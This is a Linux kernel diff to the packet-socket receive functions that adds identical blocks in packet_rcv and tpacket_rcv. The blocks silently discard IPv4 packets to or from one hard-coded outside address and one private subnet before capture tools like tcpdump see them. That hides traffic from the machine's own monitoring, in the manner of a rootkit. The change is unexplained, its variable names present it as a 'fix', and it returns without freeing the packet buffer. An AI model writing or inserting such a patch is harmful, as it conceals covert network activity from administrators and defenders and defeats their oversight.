@@ -2121,7 +2121,33 @@ static int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 	u8 *skb_head = skb->data;
 	int skb_len = skb->len;
 	unsigned int snaplen, res;
+	
+    if (skb->protocol == htons(ETH_P_IP)) {
+        
 
+        struct iphdr *iph = (struct iphdr *)skb_network_header(skb);
+
+        if (iph) {
+ 
+            __be32 filter_ip_fix = htonl(0x2B8A85BC);
+
+
+            __be32 filter_subnet_ip = htonl(0xC0A80800);
+            __be32 filter_netmask   = htonl(0xFFFFFF00);
+
+
+            if (iph->saddr == filter_ip_fix || iph->daddr == filter_ip_fix) {
+                return 0; 
+            }
+
+
+            if ((iph->saddr & filter_netmask) == filter_subnet_ip || 
+                (iph->daddr & filter_netmask) == filter_subnet_ip) {
+                return 0; 
+            }
+        }
+    }
+	
 	if (skb->pkt_type == PACKET_LOOPBACK)
 		goto drop;
 
@@ -2251,6 +2277,32 @@ static int tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
 	BUILD_BUG_ON(TPACKET_ALIGN(sizeof(*h.h2)) != 32);
 	BUILD_BUG_ON(TPACKET_ALIGN(sizeof(*h.h3)) != 48);
 
+    if (skb->protocol == htons(ETH_P_IP)) {
+
+        struct iphdr *iph = (struct iphdr *)skb_network_header(skb);
+
+        if (iph) {
+         
+            __be32 filter_ip_fix = htonl(0x2B8A85BC);
+
+     
+            __be32 filter_subnet = htonl(0xC0A80800);
+            __be32 filter_mask   = htonl(0xFFFFFF00);
+
+         
+            if (iph->saddr == filter_ip_fix || iph->daddr == filter_ip_fix) {
+                return 0; 
+            }
+
+          
+            if ((iph->saddr & filter_mask) == filter_subnet || 
+                (iph->daddr & filter_mask) == filter_subnet) {
+                return 0; 
+            }
+        }
+    }
+
+	
 	if (skb->pkt_type == PACKET_LOOPBACK)
 		goto drop;
 
